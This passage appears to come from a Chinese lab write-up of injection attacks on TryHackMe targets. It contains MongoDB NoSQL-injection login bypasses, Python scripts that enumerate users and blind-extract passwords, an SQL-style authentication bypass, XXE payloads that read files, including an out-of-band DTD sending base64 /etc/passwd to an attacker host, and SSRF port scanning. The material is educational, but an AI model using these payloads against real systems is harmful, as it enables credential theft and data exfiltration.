class="variable">$record</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>] = <span class="variable">$usr</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /sekr3tPl4ce.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?err=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因此让传入的数据是不等于一个错误的账号密码，那么数据库就能返回正确的账号密码，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user[$ne]=dadada&amp;pass[$ne]=adadadad</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250630112306.png"></p>
<h3 id="切换用户登录"><a href="#切换用户登录" class="headerlink" title="切换用户登录"></a>切换用户登录</h3><p>换个用户登录，那就是注入语句改为不匹配admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user[$nin][]=admin&amp;pass[$ne]=adadadad</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250630112652.png"><br>写脚本爆破拿到别的用户名，用<code>$regex</code>选择值匹配指定正则表达式的文档<br>用正则去逐步枚举以某些字符开头的用户名，比如 <code>^a</code>、<code>^b</code>、<code>^c</code> 等</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">base_url = <span class="string">&quot;http://10.10.226.16&quot;</span></span><br><span class="line">login_url = base_url + <span class="string">&quot;/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;10.10.226.16&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: base_url,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: base_url + <span class="string">&quot;/&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取用户名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_username</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;&lt;td&gt;\s*User:\s*&lt;/td&gt;\s*&lt;td&gt;([^&lt;]+)&lt;/td&gt;&quot;</span>, html, re.IGNORECASE)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_and_collect_users</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    found_users = <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Starting regex-based MongoDB injection to enumerate users...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_lowercase:  <span class="comment"># a-z</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;user[$regex]&quot;</span>: <span class="string">f&quot;^<span class="subst">&#123;char&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pass[$ne]&quot;</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">            <span class="string">&quot;remember&quot;</span>: <span class="string">&quot;on&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = session.post(login_url, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[^<span class="subst">&#123;char&#125;</span>] POST status: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">302</span> <span class="keyword">and</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">in</span> response.headers:</span><br><span class="line">                redirect_url = base_url + response.headers[<span class="string">&quot;Location&quot;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Redirecting to: <span class="subst">&#123;redirect_url&#125;</span>&quot;</span>)</span><br><span class="line">                final_response = session.get(redirect_url, headers=headers)</span><br><span class="line"></span><br><span class="line">                username = extract_username(final_response.text)</span><br><span class="line">                <span class="keyword">if</span> username:</span><br><span class="line">                    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> found_users:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[✔] Found NEW user: <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[~] Duplicate user: <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">                    found_users.add(username)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[×] No username found in redirected page.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[×] No redirect (status <span class="subst">&#123;response.status_code&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n================== RESULT ==================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Total unique users found: <span class="subst">&#123;<span class="built_in">len</span>(found_users)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] User list:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> <span class="built_in">sorted</span>(found_users):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;============================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    inject_and_collect_users()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250630135433.png"></p>
<h3 id="拿密码"><a href="#拿密码" class="headerlink" title="拿密码"></a>拿密码</h3><p>写脚本盲注了直接，思路就是先知道位数，然后再盲注拿数据<br><code>user=john&amp;pass[$regex]=^.&#123;8&#125;$&amp;remember=on</code>以及<code>user=john&amp;pass[$regex]=^a.......$&amp;remember=on</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">base_url = <span class="string">&quot;http://10.10.123.107&quot;</span></span><br><span class="line">login_url = base_url + <span class="string">&quot;/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;10.10.123.107&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: base_url,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: base_url + <span class="string">&quot;/&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_username</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;\s*User:\s*\s*([^&lt;]+)&quot;</span>, html, re.IGNORECASE)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password_length</span>(<span class="params">session, length</span>):</span><br><span class="line">    regex = <span class="string">f&quot;^.&#123;&#123;<span class="subst">&#123;length&#125;</span>&#125;&#125;$&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;pedro&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pass[$regex]&quot;</span>: regex,</span><br><span class="line">        <span class="string">&quot;remember&quot;</span>: <span class="string">&quot;on&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(login_url, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">302</span> <span class="keyword">and</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">in</span> response.headers:</span><br><span class="line">            redirect_url = base_url + response.headers[<span class="string">&quot;Location&quot;</span>]</span><br><span class="line">            final_resp = session.get(redirect_url, headers=headers)</span><br><span class="line">            user = extract_username(final_resp.text)</span><br><span class="line">            <span class="keyword">if</span> user <span class="keyword">and</span> user.lower() == <span class="string">&quot;pedro&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Length check error for <span class="subst">&#123;length&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_password_prefix</span>(<span class="params">session, prefix, total_length</span>):</span><br><span class="line">    remaining_len = total_length - <span class="built_in">len</span>(prefix)</span><br><span class="line">    regex = <span class="string">f&quot;^<span class="subst">&#123;prefix&#125;</span>&quot;</span> + <span class="string">f&quot;.&#123;&#123;<span class="subst">&#123;remaining_len&#125;</span>&#125;&#125;$&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;pedro&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pass[$regex]&quot;</span>: regex,</span><br><span class="line">        <span class="string">&quot;remember&quot;</span>: <span class="string">&quot;on&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(login_url, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">302</span> <span class="keyword">and</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">in</span> response.headers:</span><br><span class="line">            redirect_url = base_url + response.headers[<span class="string">&quot;Location&quot;</span>]</span><br><span class="line">            final_resp = session.get(redirect_url, headers=headers)</span><br><span class="line">            user = extract_username(final_resp.text)</span><br><span class="line">            <span class="keyword">if</span> user <span class="keyword">and</span> user.lower() == <span class="string">&quot;pedro&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Request error with prefix &#x27;<span class="subst">&#123;prefix&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce_password</span>(<span class="params">session, length</span>):</span><br><span class="line">    charset = string.ascii_letters + string.digits + <span class="string">&quot;!@#$%^&amp;*&quot;</span></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Starting password brute-force for length <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        found_char = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">            attempt = password + c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[~] Trying prefix: &#x27;<span class="subst">&#123;attempt&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> is_valid_password_prefix(session, attempt, length):</span><br><span class="line">                password += c</span><br><span class="line">                found_char = c</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[✔] Found character at position <span class="subst">&#123;pos + <span class="number">1</span>&#125;</span>: &#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_char <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[×] Failed to find character at position <span class="subst">&#123;pos + <span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    max_length = <span class="number">30</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Starting password length enumeration...&quot;</span>)</span><br><span class="line">    password_length = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Trying length: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check_password_length(session, length):</span><br><span class="line">            password_length = length</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[✔] Password length determined: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> password_length <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[×] Failed to determine password length&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    password = bruteforce_password(session, password_length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[✔] Password cracked: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250630142941.png"><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250630143018.png"></p>
<h2 id="语法注入"><a href="#语法注入" class="headerlink" title="语法注入"></a><strong>语法注入</strong></h2><h3 id="ssh身份验证"><a href="#ssh身份验证" class="headerlink" title="ssh身份验证"></a>ssh身份验证</h3><p>单引号起手，查询语句爆出来，说明闭合了<br><img src="/../../../../images/THM/Injection_Attacks/535820494a58a20993ce9d86be3e698e.png"><br>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;||1||&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250630143819.png"></p>
<h1 id="XXE-注入"><a href="#XXE-注入" class="headerlink" title="XXE 注入"></a>XXE 注入</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>DTD 在 XXE 注入中起着至关重要的作用，因为它们可用于声明外部实体。外部实体可以引用外部文件或 URL，这可能会导致恶意数据或代码注入</p>
<p>内部 DTD 使用 <code>&lt;！DOCTYPE</code> 声明，而外部 DTD 则使用 SYSTEM 关键字引用</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">config</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">config</span> (<span class="keyword">database</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">database</span> (<span class="keyword">username</span>, <span class="keyword">password</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">username</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">password</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- configuration data --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="XML-实体"><a href="#XML-实体" class="headerlink" title="XML 实体"></a>XML 实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">external</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://example.com/test.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;external;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这将显示引用 URL 的外部实体。XML 文档中的 <code>&amp;external;</code> 引用将扩展到引用的 URL 的内容</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="带内"><a href="#带内" class="headerlink" title="带内"></a>带内</h3><p><code>yakit</code>要注意格式化，这点<code>burp</code>比<code>yakit</code>强</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;contact&gt;</span><br><span class="line"> &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line"> &lt;email&gt;test@test.com&lt;/email&gt;</span><br><span class="line"> &lt;message&gt;test&lt;/message&gt;</span><br><span class="line">&lt;/contact&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701095922.png"></p>
<h3 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h3><p>先制作一个dtd文件，目的是读取<code>/etc/passwd</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY c SYSTEM &#x27;http://10.21.170.43:404/?data=%a;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%b;</span><br></pre></td></tr></table></figure>
<p>发送payload，引用c实体，因为引入了外部实体，相当于是直接引入了b实体，而b实体就是<code>&lt;!ENTITY c SYSTEM &#39;http://10.21.170.43:404/?data=%a;&#39;&gt;</code>，然后就可以带入带内xxe的思想，我们实际要用的就是c实体</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">upload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://10.21.170.43:404/1.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">upload</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">file</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">upload</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701101922.png"><br><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701102012.png"></p>
<h3 id="SSRF-XXE"><a href="#SSRF-XXE" class="headerlink" title="SSRF + XXE"></a>SSRF + XXE</h3><p>直接扫端口，<code>yakit</code>真方便直接<code>{{</code>然后选就行了</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:&#123;&#123;array(&#123;&#123;int(1-100)&#125;&#125;)&#125;&#125;/&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">contact</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">email</span>&gt;</span>test@test.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">message</span>&gt;</span>test<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">contact</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../../../images/THM/Injection_Attacks/Pasted%20image%2020250701103544.png"></p>
<h1 id="SSTI-服务器端模板注入"><a href="#SSTI-服务器端模板注入" class="headerlink" title="SSTI(服务器端模板注入)"></a>SSTI(服务器端模板注入)</h1><h3 id="SSTI-攻击的流程"><a href="#SSTI-攻击的流程" class="headerlink" title="SSTI 攻击的流程"></a>SSTI 攻击的流程</h3><ol>
<li>读取或修改服务器端文件</li>
<li>执行系统命令</li>
<li>访问敏感信息（例如，环境变量、数据库凭证）</li>
</ol>
<h2 id="确定模板引擎"><a href="#确定模板引擎" class="headerlink" title="确定模板引擎"></a>确定模板引擎</h2><h3 id="Jinja2（python）"><a href="#Jinja2（python）" class="headerlink" title="Jinja2（python）"></a><strong>Jinja2</strong>（python）</h3><p><code>{{7*'7'}}</code> 输出为7个7</p>
<h3 id="Twig（PHP）"><a href="#Twig（PHP）" class="headerlink" title="Twig（PHP）"></a><strong>Twig</strong>（PHP）</h3><p><code>{{7*'7'}}</code> 输出为49</p>
